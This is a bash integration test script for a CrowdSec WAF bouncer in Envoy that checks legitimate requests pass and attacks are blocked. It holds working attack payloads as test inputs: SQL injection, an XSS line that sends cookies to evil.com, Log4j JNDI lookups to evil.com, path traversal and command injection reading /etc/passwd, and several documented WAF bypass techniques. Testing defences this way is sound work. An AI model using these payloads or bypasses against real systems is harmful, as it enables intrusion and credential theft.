#!/bin/bash
set -euo pipefail

ENVOY_URL="${ENVOY_URL:-http://localhost:8000}"
ENVOY_ASYNC_URL="${ENVOY_ASYNC_URL:-http://localhost:8001}"
ENVOY_FAILOPEN_URL="${ENVOY_FAILOPEN_URL:-http://localhost:8002}"
ENVOY_LAPI_URL="${ENVOY_LAPI_URL:-http://localhost:8003}"
ENVOY_SLOW_URL="${ENVOY_SLOW_URL:-http://localhost:8004}"
PASS=0
FAIL=0
TOTAL=0

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

assert_status() {
    local description="$1"
    local expected="$2"
    shift 2
    TOTAL=$((TOTAL + 1))

    local status
    status=$(curl -s -o /dev/null -w '%{http_code}' "$@" 2>/dev/null) || true

    if [ "$status" = "$expected" ]; then
        echo -e "${GREEN}PASS${NC} [$status] $description"
        PASS=$((PASS + 1))
    else
        echo -e "${RED}FAIL${NC} [$status expected $expected] $description"
        FAIL=$((FAIL + 1))
    fi
}

# Asserts on status code AND whether the body contains (or, with want=0, must not
# contain) a marker string. Used to catch cases where the status code alone can't
# tell a real backend response apart from a synthesized one (e.g. a bot-detection
# challenge page also returns 200, same as a real passthrough response).
assert_body() {
    local description="$1"
    local expected_status="$2"
    local want="$3" # 1 = body must contain needle, 0 = body must not contain needle
    local needle="$4"
    shift 4
    TOTAL=$((TOTAL + 1))

    local tmp
    tmp=$(mktemp)
    local status
    status=$(curl -s -o "$tmp" -w '%{http_code}' "$@" 2>/dev/null) || true

    local has_needle=0
    grep -q -- "$needle" "$tmp" && has_needle=1

    if [ "$status" = "$expected_status" ] && [ "$has_needle" = "$want" ]; then
        echo -e "${GREEN}PASS${NC} [$status] $description"
        PASS=$((PASS + 1))
    else
        echo -e "${RED}FAIL${NC} [$status expected $expected_status, body match=$has_needle expected $want] $description"
        FAIL=$((FAIL + 1))
    fi
    rm -f "$tmp"
}

# Drives tests/trailer_client.py from a throwaway container on the compose network.
# curl cannot emit HTTP trailers and bash's /dev/tcp is not reliably available, so the
# raw request is sent from inside the network instead of through the published port.
# See tests/trailer_client.py for why the trailer case needs its own coverage.
TRAILER_TARGET_SERVICE="${TRAILER_TARGET_SERVICE:-envoy}"
TRAILER_TARGET_PORT="${TRAILER_TARGET_PORT:-8000}"
TRAILER_NETWORK="${TRAILER_NETWORK:-tests_default}"

assert_trailer_status() {
    local description="$1"
    local expected="$2"
    local body="$3"
    TOTAL=$((TOTAL + 1))

    local status
    status=$(docker run --rm --network "$TRAILER_NETWORK" \
        -v "$(pwd)/trailer_client.py:/trailer_client.py:ro" \
        python:3-alpine python3 /trailer_client.py \
        "$TRAILER_TARGET_SERVICE" "$TRAILER_TARGET_PORT" /post "$body" 2>/dev/null) || true
    status="${status:-no-response}"

    if [ "$status" = "$expected" ]; then
        echo -e "${GREEN}PASS${NC} [$status] $description"
        PASS=$((PASS + 1))
    else
        echo -e "${RED}FAIL${NC} [$status expected $expected] $description"
        FAIL=$((FAIL + 1))
    fi
}

# Asserts a marker appears in a service's log. Used to prove a test actually exercised
# the code path it claims to, rather than passing for an unrelated reason.
assert_log_contains() {
    local description="$1"
    local service="$2"
    local needle="$3"
    TOTAL=$((TOTAL + 1))

    # Capture first and match with a bash builtin rather than piping into grep -q:
    # under `set -o pipefail` grep -q exits on the first match, SIGPIPEs docker compose,
    # and that non-zero exit poisons the pipeline into a false negative.
    local logs
    logs=$(docker compose logs "$service" 2>/dev/null || true)

    if [[ "$logs" == *"$needle"* ]]; then
        echo -e "${GREEN}PASS${NC} [log] $description"
        PASS=$((PASS + 1))
    else
        echo -e "${RED}FAIL${NC} [log] $description"
        FAIL=$((FAIL + 1))
    fi
}

cscli() {
    docker compose exec -T crowdsec cscli "$@" >/dev/null 2>&1 || true
}

echo "============================================="
echo " CrowdSec WASM Bouncer - Integration Tests"
echo "============================================="
echo ""
echo "Target: $ENVOY_URL"
echo ""

# -----------------------------------------------------------
# Wait for envoy to be ready
# -----------------------------------------------------------
echo -e "${YELLOW}Waiting for Envoy to be ready...${NC}"
for i in $(seq 1 120); do
    if curl -sf -o /dev/null "$ENVOY_URL/get" 2>/dev/null; then
        echo -e "${GREEN}Envoy is ready.${NC}"
        break
    fi
    if [ "$i" -eq 120 ]; then
        echo -e "${RED}Envoy did not become ready in time.${NC}"
        exit 1
    fi
    sleep 2
done
echo ""

# -----------------------------------------------------------
# Legitimate requests — should pass (200)
# -----------------------------------------------------------
echo -e "${YELLOW}=== Legitimate Requests (expect 200) ===${NC}"
echo ""

assert_status "GET simple request" 200 \
    "$ENVOY_URL/get"

assert_status "GET with query params" 200 \
    "$ENVOY_URL/get?foo=bar&page=1"

assert_status "POST JSON body" 200 \
    -X POST "$ENVOY_URL/post" \
    -H "Content-Type: application/json" \
    -d '{"username":"alice","email":"alice@example.com"}'

assert_status "PUT JSON body" 200 \
    -X PUT "$ENVOY_URL/put" \
    -H "Content-Type: application/json" \
    -d '{"id":1,"name":"updated item"}'

assert_status "PATCH JSON body" 200 \
    -X PATCH "$ENVOY_URL/patch" \
    -H "Content-Type: application/json" \
    -d '{"status":"active"}'

assert_status "POST form-urlencoded" 200 \
    -X POST "$ENVOY_URL/post" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d 'username=alice&password=correcthorsebatterystaple'

assert_status "POST multipart form" 200 \
    -X POST "$ENVOY_URL/post" \
    -F "file=@/dev/null;filename=empty.txt" \
    -F "description=test upload"

assert_status "DELETE request" 200 \
    -X DELETE "$ENVOY_URL/delete"

assert_status "GET with normal user-agent" 200 \
    -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \
    "$ENVOY_URL/get"

assert_status "POST large-ish JSON body" 200 \
    -X POST "$ENVOY_URL/post" \
    -H "Content-Type: application/json" \
    -d "{\"data\":\"$(head -c 4096 /dev/urandom | base64 | tr -d '\n')\"}"

echo ""

# -----------------------------------------------------------
# SQL Injection — should block (403)
# -----------------------------------------------------------
echo -e "${YELLOW}=== SQL Injection (expect 403) ===${NC}"
echo ""

assert_status "SQLi in GET query param" 403 \
    "$ENVOY_URL/get?id=1%20OR%201%3D1--"

assert_status "SQLi UNION SELECT in query" 403 \
    "$ENVOY_URL/get?id=1%20UNION%20SELECT%20username,password%20FROM%20users--"

assert_status "SQLi in POST JSON body" 403 \
    -X POST "$ENVOY_URL/post" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin'\'' OR 1=1--","password":"x"}'

assert_status "SQLi in POST form body" 403 \
    -X POST "$ENVOY_URL/post" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=admin'%20OR%201%3D1--&password=x"

assert_status "SQLi with sleep in body" 403 \
    -X POST "$ENVOY_URL/post" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "id=1;WAITFOR DELAY '0:0:5'--"

# Regression for the AppSec body-truncation bypass: a leading non-ASCII byte must
# not hide the SQLi payload that follows it from AppSec inspection.
assert_status "SQLi hidden behind leading non-ASCII byte (bypass regression)" 403 \
    -X POST "$ENVOY_URL/post" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-binary $'\xC3\xA9username=admin\' OR 1=1--&password=x'

echo ""

# -----------------------------------------------------------
# XSS — should block (403)
# -----------------------------------------------------------
echo -e "${YELLOW}=== XSS Attacks (expect 403) ===${NC}"
echo ""

assert_status "XSS script tag in GET param" 403 \
    "$ENVOY_URL/get?q=%3Cscript%3Ealert(1)%3C/script%3E"

assert_status "XSS in POST body" 403 \
    -X POST "$ENVOY_URL/post" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d 'comment=<script>document.location="http://evil.com/?c="+document.cookie</script>'

assert_status "XSS img onerror in body" 403 \
    -X POST "$ENVOY_URL/post" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d 'input=<img src=x onerror=alert(1)>'

assert_status "XSS event handler in query" 403 \
    "$ENVOY_URL/get?x=%22%20onmouseover%3Dalert(1)%20%22"

echo ""

# -----------------------------------------------------------
# Path Traversal — should block (403)
# -----------------------------------------------------------
echo -e "${YELLOW}=== Path Traversal (expect 403) ===${NC}"
echo ""

assert_status "Path traversal /etc/passwd" 403 \
    "$ENVOY_URL/get?file=../../../etc/passwd"

assert_status "Path traversal encoded" 403 \
    "$ENVOY_URL/get?file=..%2F..%2F..%2Fetc%2Fpasswd"

assert_status "Dot-env file access" 403 \
    "$ENVOY_URL/.env"

echo ""

# -----------------------------------------------------------
# Command Injection — should block (403)
# -----------------------------------------------------------
echo -e "${YELLOW}=== Command Injection (expect 403) ===${NC}"
echo ""

assert_status "OS command injection in body" 403 \
    -X POST "$ENVOY_URL/post" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d 'cmd=;cat /etc/passwd'

echo ""

# -----------------------------------------------------------
# Log4j / JNDI — should block (403)
# -----------------------------------------------------------
echo -e "${YELLOW}=== Log4j / JNDI (expect 403) ===${NC}"
echo ""

assert_status "JNDI in User-Agent header" 403 \
    -H 'User-Agent: ${jndi:ldap://evil.com/a}' \
    "$ENVOY_URL/get"

assert_status "JNDI in POST body" 403 \
    -X POST "$ENVOY_URL/post" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d 'input=${jndi:ldap://evil.com/exploit}'

echo ""

# -----------------------------------------------------------
# Large payload tests — 1GB
# -----------------------------------------------------------
echo -e "${YELLOW}=== Large Payload Tests (1GB) ===${NC}"
echo ""

# 1GB POST with SQLi in the first line — should block (403)
TOTAL=$((TOTAL + 1))
description="1GB POST with SQLi in first line"
status=$( (printf "username=admin' OR 1=1--&data="; dd if=/dev/urandom bs=1M count=1024 status=none) \
    | curl -s -o /dev/null -w '%{http_code}' \
        -X POST "$ENVOY_URL/upload" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -T - 2>/dev/null) || true
if [ "$status" = "403" ]; then
    echo -e "${GREEN}PASS${NC} [$status] $description"
    PASS=$((PASS + 1))
else
    echo -e "${RED}FAIL${NC} [$status expected 403] $description"
    FAIL=$((FAIL + 1))
fi

# 1GB POST legitimate — should pass (200)
TOTAL=$((TOTAL + 1))
description="1GB POST legitimate payload"
status=$(dd if=/dev/urandom bs=1M count=1024 status=none \
    | curl -s -o /dev/null -w '%{http_code}' \
        -X POST "$ENVOY_URL/upload" \
        -H "Content-Type: application/octet-stream" \
        -T - 2>/dev/null) || true
if [ "$status" = "200" ]; then
    echo -e "${GREEN}PASS${NC} [$status] $description"
    PASS=$((PASS + 1))
else
    echo -e "${RED}FAIL${NC} [$status expected 200] $description"
    FAIL=$((FAIL + 1))
fi

echo ""

# -----------------------------------------------------------
# Bot Detection Challenge (AppSec bot_detection feature)
# -----------------------------------------------------------
# tests/crowdsec/appsec-configs/bot-challenge-test.yaml scopes the challenge trigger
# to /challenge-test only, so it can't interfere with the 200/403 assertions above
# (curl can never solve the PoW, so a globally-applied challenge would silently turn
# every "legitimate 200" case above into a 200-status challenge page instead of real
# backend content).
echo -e "${YELLOW}=== Bot Detection Challenge ===${NC}"
echo ""

assert_body "Challenge issued on scoped test path" 200 1 "CrowdSec Challenge" \
    "$ENVOY_URL/challenge-test"

assert_body "Normal path unaffected by bot detection (regression guard)" 200 0 "CrowdSec Challenge" \
    "$ENVOY_URL/get"

assert_status "Internal endpoint fpscanner.js reachable" 200 \
    "$ENVOY_URL/crowdsec-internal/challenge/fpscanner.js"

assert_status "Internal endpoint pow-worker.js reachable" 200 \
    "$ENVOY_URL/crowdsec-internal/challenge/pow-worker.js"

echo ""

# -----------------------------------------------------------
# WAF bypass regressions
# -----------------------------------------------------------
# Each case here passed uninspected before the corresponding fix. They are the reason
# the fixes exist, so they must stay in the suite.
echo -e "${YELLOW}=== WAF Bypass Regressions (expect 403) ===${NC}"
echo ""

# Trailers used to suppress the AppSec dispatch entirely
assert_trailer_status "SQLi in a chunked body terminated by trailers" 403 \
    "username=admin' OR 1=1--"

assert_trailer_status "JNDI in a chunked body terminated by trailers" 403 \
    'input=${jndi:ldap://evil.com/exploit}'

# Negative control: dispatching on trailers must not turn into a blanket block
assert_trailer_status "Clean chunked body terminated by trailers still passes" 200 \
    'field=value&other=thing'

# Only User-Agent and Cookie used to reach AppSec, so every other header was invisible
assert_status "JNDI in Referer header" 403 \
    -H 'Referer: http://evil.com/${jndi:ldap://evil.com/a}' \
    "$ENVOY_URL/get"

assert_status "JNDI in an arbitrary custom header" 403 \
    -H 'X-Api-Version: ${jndi:ldap://evil.com/a}' \
    "$ENVOY_URL/get"

# A binary Content-Type used to skip body inspection on the strength of the header alone
assert_status "SQLi body mislabelled as application/octet-stream" 403 \
    -X POST "$ENVOY_URL/post" \
    -H "Content-Type: application/octet-stream" \
    -d "username=admin' OR 1=1--"

assert_status "XSS body mislabelled as image/png" 403 \
    -X POST "$ENVOY_URL/post" \
    -H "Content-Type: image/png" \
    -d '<script>alert(document.cookie)</script>'

# Bodies on methods outside the old POST/PUT/PATCH allowlist
assert_status "SQLi in a DELETE body" 403 \
    -X DELETE "$ENVOY_URL/delete" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=admin' OR 1=1--"

assert_status "SQLi in a GET body" 403 \
    -X GET "$ENVOY_URL/get" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=admin' OR 1=1--"

# A client must never be able to speak the AppSec control protocol itself
assert_status "Client-supplied X-Crowdsec-Appsec-Ip cannot override identity" 403 \
    -H 'X-Crowdsec-Appsec-Ip: 127.0.0.1' \
    -H 'X-Crowdsec-Appsec-Api-Key: bogus' \
    -H 'User-Agent: ${jndi:ldap://evil.com/a}' \
    "$ENVOY_URL/get"

echo ""

# -----------------------------------------------------------
# False-positive guards for the content sniff
# -----------------------------------------------------------
echo -e "${YELLOW}=== Binary Upload Guards (expect 200) ===${NC}"
echo ""

# The reason the binary skip exists: real binary uploads must not be scored as text
printf '\x89PNG\r\n\x1a\n\x00\x00\x00\x0dIHDR\x00\x00\x00\x01' > /tmp/cs-test.png
dd if=/dev/urandom bs=1k count=32 status=none >> /tmp/cs-test.png
assert_status "Genuine PNG upload still passes" 200 \
    -X POST "$ENVOY_URL/post" \
    -H "Content-Type: image/png" \
    --data-binary @/tmp/cs-test.png
rm -f /tmp/cs-test.png

assert_status "HTTP/1.0 request is handled" 200 \
    --http1.0 "$ENVOY_URL/get"

echo ""

# -----------------------------------------------------------
# CrowdSec test probe
# -----------------------------------------------------------
echo -e "${YELLOW}=== CrowdSec Test Probe ===${NC}"
echo ""

assert_status "CrowdSec AppSec test probe (expect 403)" 403 \
    "$ENVOY_URL/crowdsec-test-NtktlJHV4TfBSK3wvlhiOBnl"

assert_status "CrowdSec AppSec test probe (async) (expect 404)" 404 \
    "$ENVOY_ASYNC_URL/crowdsec-test-NtktlJHV4TfBSK3wvlhiOBnl"

assert_status "CrowdSec AppSec test probe (fail_open) (expect 404)" 404 \
    "$ENVOY_FAILOPEN_URL/crowdsec-test-NtktlJHV4TfBSK3wvlhiOBnl"
echo ""

# -----------------------------------------------------------
# LAPI decisions: exact IPs, CIDR ranges, and X-Forwarded-For resolution
# -----------------------------------------------------------
# Runs against the envoy-lapi listener, which has LAPI on, AppSec off (so these
# assertions isolate decision matching) and RFC1918 trusted_ips, so the public
# addresses below are genuine untrusted hops in the forwarded chain.
echo -e "${YELLOW}=== LAPI Decisions (IP, Range, XFF) ===${NC}"
echo ""

echo "Seeding decisions and waiting for the bouncer to sync..."
cscli decisions delete --all
cscli decisions add -i 9.9.9.9 -d 2h -t ban -R integration/xff-test
cscli decisions add -r 9.9.8.0/24 -d 2h -t ban -R integration/range-test

lapi_ready=0
for i in $(seq 1 60); do
    if curl -sf -o /dev/null "$ENVOY_LAPI_URL/get" 2>/dev/null; then
        lapi_ready=1
        break
    fi
    sleep 2
done
if [ "$lapi_ready" = "0" ]; then
    echo -e "${RED}envoy-lapi did not become ready, skipping LAPI assertions.${NC}"
else
    # sync_freq is 5s on this listener; allow two ticks
    sleep 12

    assert_status "Unbanned client passes" 200 \
        "$ENVOY_LAPI_URL/get"

    assert_status "Banned IP as the rightmost forwarded hop is blocked" 403 \
        -H "X-Forwarded-For: 9.9.9.9" \
        "$ENVOY_LAPI_URL/get"

    # Regression for the leftmost-XFF bug: the client controls the left of the chain,
    # so a banned client could prepend a clean entry and walk straight past its ban.
    assert_status "Banned client cannot evade by prepending a clean XFF entry" 403 \
        -H "X-Forwarded-For: 1.1.1.1, 9.9.9.9" \
        "$ENVOY_LAPI_URL/get"

    # The same bug in the other direction: a spoofed leftmost entry must not be able to
    # get an innocent client blocked.
    assert_status "Spoofed leftmost XFF entry does not block an innocent client" 200 \
        -H "X-Forwarded-For: 9.9.9.9, 8.8.8.8" \
        "$ENVOY_LAPI_URL/get"

    # Regression for Range-scope decisions, which used to be synced and then never
    # consulted - community blocklists are largely CIDR, so every one of them was inert.
    assert_status "IP inside a banned CIDR range is blocked" 403 \
        -H "X-Forwarded-For: 9.9.8.77" \
        "$ENVOY_LAPI_URL/get"

    assert_status "IP outside the banned CIDR range passes" 200 \
        -H "X-Forwarded-For: 9.9.7.77" \
        "$ENVOY_LAPI_URL/get"

    cscli decisions delete --all
fi
echo ""

# -----------------------------------------------------------
# Late verdict: a local reply must beat an in-flight upstream response
# -----------------------------------------------------------
# For a request with a streamed body the filter forwards it upstream while the AppSec
# call is in flight and blocks by calling send_http_response during response encoding.
# That is the only enforcement path such a request has, and it is normally untested
# because AppSec and the origin answer within the same millisecond. envoy-slowappsec
# points at a stand-in that sleeps 800ms, which guarantees the origin responds first.
#
# Transfer-Encoding: chunked is what makes the body stream: with a plain Content-Length
# body Envoy can hand the filter headers and body together, the filter pauses at headers,
# and the request never reaches the origin at all - which would not exercise this path.
echo -e "${YELLOW}=== Late AppSec Verdict vs In-Flight Response ===${NC}"
echo ""

slow_ready=0
for i in $(seq 1 60); do
    if curl -sf -o /dev/null -m 5 "$ENVOY_SLOW_URL/get" 2>/dev/null; then
        slow_ready=1
        break
    fi
    sleep 2
done
if [ "$slow_ready" = "0" ]; then
    echo -e "${RED}envoy-slowappsec did not become ready, skipping.${NC}"
else
    # The origin echoes the marker. If the client ever sees it on a blocked request, the
    # local reply lost the race and the backend's response was served instead.
    assert_body "Late block is enforced, origin response not served" 403 0 "M9ORIGINMARKER" \
        -X POST "$ENVOY_SLOW_URL/post?block=1" \
        -H "Transfer-Encoding: chunked" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "x=M9ORIGINMARKER"

    # Control: proves the pause/resume path returns the real response rather than the
    # suite simply failing everything closed
    assert_body "Late allow resumes the real origin response" 200 1 "M9ORIGINMARKER" \
        -X POST "$ENVOY_SLOW_URL/post" \
        -H "Transfer-Encoding: chunked" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "x=M9ORIGINMARKER"

    # Without this the two assertions above could both pass while the response was never
    # paused at all, making them a test of nothing
    assert_log_contains "Response pause path was actually exercised" \
        envoy-slowappsec "pausing response"
fi
echo ""

# -----------------------------------------------------------
# Results
# -----------------------------------------------------------
echo "============================================="
echo -e " Results: ${GREEN}$PASS passed${NC}, ${RED}$FAIL failed${NC}, $TOTAL total"
echo "============================================="

if [ "$FAIL" -gt 0 ]; then
    exit 1
fi
